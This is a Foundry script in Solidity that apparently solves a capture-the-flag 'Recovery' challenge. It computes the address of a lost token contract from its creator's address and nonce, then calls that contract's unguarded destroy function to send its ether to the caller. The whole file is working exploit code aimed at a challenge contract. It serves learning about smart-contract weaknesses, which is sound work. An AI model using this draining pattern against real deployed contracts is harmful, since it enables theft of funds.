// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract RecoverEth {
    Recovery public instance = Recovery(0x4A8CDDDCcB285c27F9f59195DcA42fE343283b63);

    function recoverEth() external view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01)));
        address addr = address(uint160(uint256(hash)));
        return addr;
    }
}

contract RecoverSolution is Script {
    RecoverEth recover;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("The initial balance of user: ", address(this).balance);
        recover = new RecoverEth();
        SimpleToken contractAdd = SimpleToken(payable(recover.recoverEth()));
        contractAdd.destroy(payable(address(this)));
        console.log("The final balance of user: ", address(this).balance);
        vm.stopBroadcast();
    }
}
